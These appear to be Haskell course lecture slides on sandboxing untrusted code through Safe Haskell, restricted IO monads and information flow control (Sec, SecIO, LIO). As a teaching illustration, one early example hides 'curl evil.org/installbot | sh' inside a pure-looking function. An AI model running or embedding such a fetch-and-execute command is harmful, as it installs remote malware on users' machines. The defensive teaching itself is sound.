
# Administrivia

* Bring your laptop Wednesday
    * We are going to try something different

* By now you should have figured out your project partners
* Should figure out project by end of week
* Schedule a meeting with one of us
    * I am available after 1:15pm tomorrow (Tuesday), and after 2:15pm
      Wednesday

# Untrusted code

* Say you want to incorporate untrusted code in a Haskell application
* Example:  Some third-party translation software
    * You built a web server
    * Want to add a "translate to Pig Latin" button to each web page
    * Download some random code with this function

        ~~~~ {.haskell}
        toPigLatin :: L.ByteString -> L.ByteString
        ~~~~

* If you could trust the type (no `IO`), this would be safe to run
    * Worst case, users get garbled text on web page
* However, what if you have?

    ~~~~ {.haskell}
    toPigLatin = unsafePerformIO $ do
      system "curl evil.org/installbot | sh"
      return "Ia owna ouya"
    ~~~~

# [Safe Haskell][SafeHaskell]

* Starting with GHC 7.2, `-XSafe` option enables
  [Safe Haskell][SafeHaskell]
    * Courtesy of our very own CA, David Terei
* Safe Haskell disallows import of any unsafe modules
    * E.g., can't import `System.IO.Unsafe`, so can't call `unsafePerformIO`
* Safe imports (enabled by `-XSafeImports`) require an import to be safe

    ~~~~ {.haskell}
    import safe PigLatin (toPigLatin)
    ~~~~

    * The above should guarantee that `toPigLatin` doesn't call unsafe
      functions
* But wait... doesn't `toPigLatin` use ByteString?

    ~~~~ {.haskell}
    head :: {- Lazy -} ByteString -> Word8
    head Empty       = errorEmptyList "head"
    head (Chunk c _) = S.unsafeHead c

    unsafeHead :: {- Strict -} ByteString -> Word8
    unsafeHead (PS x s l) = assert (l > 0) $
        inlinePerformIO $ withForeignPtr x $ \p -> peekByteOff p s
    ~~~~

# Safe vs. Trustworthy

* A module compiled `-XSafe` can only import safe modules
    * As if all imports implicitly have `safe` keyword
* But there are *two* kinds of safe module
    1. Modules verified to be safe by the compiler, compiled `-XSafe`
    2. Modules asserted to be safe by the author, compiled
    `-XTrustworthy`
* So a module like `Data.ByteString` can be compiled `-XTrustworthy`
    * Put unsafe functions in separate `Data.ByteString.Unsafe` module
    * Assert `Data.ByteString`'s exported symbols cannot be used
      unsafely, even if the module internally makes use of unsafe
      functions
* Of course, might or might not trust module author
    * Can specify on a per-package basis whether to honor `-XTrustworthy`
    * Use flags, `-trust` *Pkg*, `-distrust` *Pkg*, `-distrust-all-packages`
    * Can also set default for a package with `ghc-pkg`

# What if untrusted code needs to do IO?

* Suppose you want to translate to a real language
    * Generally requires massive data sets
    * Untrusted code would at minimum need to do file IO
    * Or maybe easiest send text over network to, e.g., Google translate
* Idea: use a *restricted* IO monad, `RIO`
    * Untrusted third party implements `googleTranslate` function

        ~~~~ {.haskell}
        googleTranslate :: Language -> L.ByteString -> RIO L.ByteString
        ~~~~

    * But uses the `RIO` monad, instead of `IO`
    * Implement `RIO` functions to access network, file system
    * Have functions reject *dangerous* operations
    * Can use same names and port `IO` code to `RIO` by manipulating imports

# Example: hypothetical `RIO` monad

~~~~ {.haskell}
{-# LANGUAGE Trustworthy #-}
module RIO (RIO(), runRIO, RIO.readFile) where

-- Notice that symbol UnsafeRIO is not exported from this module!
newtype RIO a = UnsafeRIO { runRIO :: IO a }
instance Monad RIO where
    return = UnsafeRIO . return
    m >>= k = UnsafeRIO $ runRIO m >>= runRIO . k

-- Returns True iff access is allowed to file name
pathOK :: FilePath -> IO Bool
pathOK file = {- Implement some policy based on file name -}

readFile :: FilePath -> RIO String
readFile file = UnsafeRIO $ do
  ok <- pathOK file
  if ok then Prelude.readFile file else return ""
~~~~

* Note use of `newtype` -- `RIO` is same as `IO` at runtime
    * Anyone can turn an `RIO` action into an `IO` one with `runRIO`
    * But cannot create `RIO` action from `IO` one without `UnsafeRIO`
      symbol...  not exported, so untrusted code cannot bury `IO`
      actions in `RIO` ones

# Example policies for RIO

* Only read and write files under some sandbox subdirectory
    * Protect most of file system from untrusted code
* Do not allow execution of other programs
    * Would escape from `RIO` restrictions
* Only allow connections to port 80, and only to known servers
    * Don't want untrusted code sending spam, attacking mysql, etc.
* Do not allow access to devices
    * Microphone, camera, speaker, etc.
* Similar to policies that apply to Java/JavaScript in browser

# Why RIO isn't enough

* What if the web site contains private data, such as email?
* An attack by malicious `googleTranslate` function:
    * Save a copy of private email under `/sandbox` (allowed)
    * When asked to translate a special string, return stored email
    * Attacker sends himself an email with special string to read stored email
* Another attack
    * Send query to attacker's own website instead of Google
* Problem: really need to keep track of what information is sensitive
    * Okay to send public data over network
    * Not okay to send email (or maybe only okay to send to specific Google URL)
    * Okay to write files, but have to keep track of which files
      contain whose email
* Solution: Decentralized Information Flow Control (DIFC)

# What is DIFC?

![](lintro.svg)

* IFC originated with military applications and classified data
* Every piece of data in the system has a label
* Every process/thread has a label
* Labels are partially ordered by $\sqsubseteq$ ("can flow to")
* Example:  Emacs (labeled $L_E$) accesses file (labeled $L_F$)

# What is DIFC?

![](lread.svg)

* IFC originated with military applications and classified data
* Every piece of data in the system has a label
* Every process/thread has a label
* Labels are partially ordered by $\sqsubseteq$ ("can flow to")
* Example:  Emacs (labeled $L_E$) accesses file (labeled $L_F$)
    * File read?  Information flows from file to emacs.  System
      requires $L_F\sqsubseteq L_E$.

# What is DIFC?

![](lwrite.svg)

* IFC originated with military applications and classified data
* Every piece of data in the system has a label
* Every process/thread has a label
* Labels are partially ordered by $\sqsubseteq$ ("can flow to")
* Example:  Emacs (labeled $L_E$) accesses file (labeled $L_F$)
    * File read?  Information flows from file to emacs.  System
      requires $L_F\sqsubseteq L_E$.
    * File write?  Information flows in both directions.  System
      enforces that $L_F\sqsubseteq L_E$ and $L_E\sqsubseteq L_F$.

# Labels are transitive

![](trans1.svg)

* $\sqsubseteq$ is a transitive relation - makes it easier to reason
  about security
* Example: Label file so it cannot flow to Internet
    * Policy holds regardless of what other software does

# Labels are transitive

![](trans2.svg)

* $\sqsubseteq$ is a transitive relation - makes it easier to reason
  about security
* Example: Label file so it cannot flow to Internet
    * Policy holds regardless of what other software does
* Suppose a buggy app reads file (e.g., desktop search)

# Labels are transitive

![](trans3.svg)

* $\sqsubseteq$ is a transitive relation - makes it easier to reason
  about security
* Example: Label file so it cannot flow to Internet
    * Policy holds regardless of what other software does
* Suppose a buggy app reads file (e.g., desktop search)
    * Process labeled $L_\mathrm{bug}$ reads file, so must have
      $L_F\sqsubseteq L_\mathrm{bug}$
    * But $L_F\sqsubseteq L_\mathrm{bug}\wedge
      L_\mathrm{bug}\sqsubseteq L_\mathrm{net}\Longrightarrow
      L_F\sqsubseteq L_\mathrm{net}$, thus
      $L_\mathrm{bug}\> !\sqsubseteq L_\mathrm{net}$

# Labels are transitive

![](trans4.svg)

* $\sqsubseteq$ is a transitive relation - makes it easier to reason
  about security
* Example: Label file so it cannot flow to Internet
    * Policy holds regardless of what other software does
* Conversely, any app that can write to network cannot read file

# Labels form a lattice

![](ablattice.svg)

* Consider two users, $A$ and $B$
    * Label public data $L_\emptyset$, $A$'s private data $L_A$, $B$'s
      private data $L_B$
* What happens if you mix $A$'s and $B$'s private data in a single document?
    * Both $A$ and $B$ should be concerned about the release of such a document
    * Need a label at least as restrictive as both $L_A$ and $L_B$
    * Use the least upper bound (a.k.a. *join*) of $L_A$ and $L_B$,
      written $L_A\sqcap L_B$

# **D**IFC is **D**ecentralized

![](decentralized.svg)

* Every process has a set of privileges
* Exercising privilege $p$ changes label requirements
    * $L_F\sqsubseteq_p\> L_\mathrm{proc}$ to read, and additionally
      $L_\mathrm{proc}\sqsubseteq_p\> L_F$ to write file
    * $\sqsubseteq_p$ (``can flow under privileges $p$'') is more
      permissive than $\sqsubseteq$
* Idea: Set labels so you know who has relevant privs.

# Example privileges

![](ablattice.svg)

* Consider again simple two user lattice
* Let $a$ be user $A$'s privileges, $b$ be user $B$'s privileges
* Clearly $L_A\sqsubseteq_a\>L_\emptyset$ and $L_B\sqsubseteq_b\>L_\emptyset$
    * Users should be able to make public or *declassify* their own private data
* Users should also be able to *partially declassify* data
    * I.e., $L_{AB}\sqsubseteq_a\>L_B$ and $L_{AB}\sqsubseteq_b\>L_A$

# The `Sec` monad [[Russo]](http://www.cse.chalmers.se/~russo/seclib.htm), [[Russo]](http://www.cse.chalmers.se/~russo/eci11/lectures/index.shtml)

* Let's encode a really simple two-point lattice in Haskell's type system
    * Let type `H` represent secret ("high") data, and `L` public ("low") data

    ~~~~ {.haskell}
    Module Sec where
    data L = Lpriv
    data H = Hpriv
    ~~~~

    * Type represents secrecy level, constructor represents privileges

    ~~~~ {.haskell}
    {-# LANGUAGE Trustworthy #-}
    Module Sec.Safe (module Sec) where
    import Sec (L, H, Sec, sec, open, up)
    ~~~~

    * Let's also (in module `Sec`) represent the lattice
      ($L\sqsubseteq H$) in the type system

    ~~~~ {.haskell}
    class Flows sl sh where
    instance Flows L L where
    instance Flows L H where
    instance Flows H H where
    -- Notice no instance for Flows H L
    ~~~~

# The `Sec` monad (continued)

* Let's protect secret values with monads by adding to module `Sec`
    * Define two monads, `Sec H` for high data, and `Sec L` for low data

    ~~~~ {.haskell}
    newtype Sec s a = MkSec a

    instance Monad (Sec s) where
      return x = MkSec x
      MkSec a >>= k = k a
    ~~~~

    * Allow anyone to label a value, but require privileges to unlabel

    ~~~~ {.haskell}
    label :: a -> Sec s a
    label x = MkSec x
    unlabel :: Sec s a -> s -> a
    unlabel (MkSec a) s = s `seq` a     -- s (H or L) acts like key
    ~~~~

    * Notice `seq` call, ensures "`unlabel undefined secval`" will crash
    * Allow data to be re-labeled according to $\sqsubseteq$ relation

    ~~~~ {.haskell}
    relabel :: (Flows lin lout) => Sec lin a -> Sec lout a
    relabel (MkSec val) = MkSec val
    ~~~~

# Applying the `Sec` monad

* Untrusted code gets access to sensitive data only in `Sec` monads
* Possible policy:
    * Data labeled `Sec L` can be sent over network
    * Data labeled `Sec H` can only be sent to Google
    * Implement by providing specific trusted functions

    ~~~~ {.haskell}
    queryGoogle :: Sec H L.ByteString -> IO (Sec H L.ByteString)
    queryGoogle labeledQuery = do
      let query = unlabel Hpriv labeledQuery  -- code is privileged,
      ...                                     -- so have Hpriv
    ~~~~

* This isn't a very satisfying solution
    * Decision to query google can't depend on data
    * So we aren't really getting the full benefit of monads (more
      like `Applicative`)

# `IO` and `Sec`

* What if instead we combined `Sec` and `IO`?

    ~~~~ {.haskell}
    untrustedTranslate :: Sec H L.ByteString -> Sec H (IO L.ByteString)
    ~~~~

   * Safe to run this computation?

# `IO` and `Sec`

* What if instead we combined `Sec` and `IO`?

    ~~~~ {.haskell}
    untrustedTranslate :: Sec H L.ByteString -> Sec H (IO L.ByteString)
    ~~~~

   * Safe to run this computation?  **No!**

    ~~~~ {.haskell}
    untrustedTranslate secbs = do
      bs <- secbs
      return $ do writeFile "PublicFile" bs -- oops, pwned
                  {- query Google for translation -}
    ~~~~

   * Let's combines idea of `RIO` and `Sec` in a `SecIO` monad

    ~~~~ {.haskell}
    newtype SecIO s a = MkSecIO (IO (Sec s a))
    instance Monad (SecIO s) where
        return x = MkSecIO (return (return x))
        MkSecIO m >>= k = MkSecIO $ do
          sa <- m
          let (MkSec a) = sa
          let MkSecIO m' = k a
          m'
    run :: SecIO s a -> IO (Sec s a)
    run (MkSecIO m) = m
    ~~~~

# The `SecIO` monad

* What does `SecIO` mean


    ~~~~ {.haskell}
    -- Can write to high files and returns high Int
    c1 :: SecIO H Int

    -- Can write to low or high files, returns high Int
    c2 :: SecIO L (Sec H Int)

    -- Can write to low or high files, returns low Int
    c3 :: SecIO L Int
    ~~~~

* How to represent files?

    ~~~~ {.haskell}
    -- Must encode level of file in type, path of file in value
    type File s = SecFilePath String

    readFileSecIO :: File s -> SecIO s' (Sec s String)
    writeFileSecIO :: File s -> String -> SecIO s ()
    ~~~~

    * Idea extends to other types of resources (e.g., `IORef`s)

<!--
    type DataInvariant a = (a -> IO Bool)
    data Loc t s a b = MkLoc t (DataInvariant a) (DataInvariant a)
    type File s = Loc FilePath s String ()
-->

# `SecIO` translator

* Still need privileged function

    ~~~~ {.haskell}
    queryGoogle :: Sec H L.ByteString -> SecIO H L.ByteString
    ~~~~

    * Represents the fact that Google is trusted with high data
    * Makes sense you need to implement this to encode policy

* Now implement untrusted code as follows

    ~~~~ {.haskell}
    untrustedTranslate :: Sec H L.ByteString -> SecIO H L.ByteString
    ~~~~

    * Function can invoke `queryGoogle`, but not send data to other places

* `SecIO` does most enforcement at compile time
* Problem: for email, really want separate labels for every *user*
    * Users added dynamically, so hard to encode this with `Flows`...

# `LIO` Monad [[Stefan]](http://www.cse.chalmers.se/~russo/publications_files/haskell11.pdf)

* More flexibility if you enforce all permission checks dynamically
* Let's define `Label`s as points on a lattice
    * Can be arbitrary data type with $\sqsubseteq$, $\sqcap$, and $\sqcup$

    ~~~~ {.haskell}
    class Eq a => POrd a where
        leq :: a -> a -> Bool
    class (POrd a, Show a, Read a) => Label a where
        lub :: a -> a -> a
        glb :: a -> a -> a
    ~~~~

    * Separately, define privileges as any type with $\sqsubseteq_p$
      for a given label type

    ~~~~ {.haskell}
    -- PrivTCB is private class, not exposed to untrusted code
    class (Label l, PrivTCB p) => Priv l p where
        leqp :: p -> l -> l -> Bool
    ~~~~

    * Note `PrivTCB` requirement in context--prevents untrusted code
      from defining instances of `Priv` class.
* These labels can easily represent many more lattice points
    * E.g., labels can be sets of users whose private data may influence value

# Need pure, side-effectful computations

* Represent labeled pure values with type wrapper

    ~~~~ {.haskell}
    data Labeled l t = LabeledTCB l t
    ~~~~

    * Pure values suitable for mashalling, insertion in database

* The `LIO l` monad (for `Label l`) is a state monad w. *current* label
    * Current label rises to LUB of all data observed
* Can label and unlabel pure values in `LIO` monad:

    ~~~~ {.haskell}
    label :: Label l => l -> a -> LIO l (Labeled l a)
    unlabel :: (Label l) => Labeled l a -> LIO l a
    unlabelP :: Priv l p => p -> Labeled l a -> LIO l a
    toLabeled :: (Label l) => l -> LIO l a -> LIO l (Labeled l a)
    ~~~~

    * `label` requires value label to be above current label
    * `unlabel` raises current label to LUB with removed `Labeled`
      (`unlabelP` uses privileges to raise label less)
    * `toLabeled` takes computation that would have raised current
      label, and instead of raising label, wraps result in `Labeled`

# Other `LIO` features

* Clearance
    * Special label maintained w. current label in `LIO` state
    * Represents upper bound on current label
    * Can lower clearance to label, but raising requires privileges
    * Allows "need-to-know" policies, reducing danger of covert channels
* Labeled file system
    * Stores labels along with files
* Labeled exceptions
    * Can only catch exceptions thrown at points below your clearance
    * Get tainted by exception when you catch it
* Research in progress to build web framework using `LIO`
    * Allows users to upload untrusted applets into web server

[SafeHaskell]: http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html
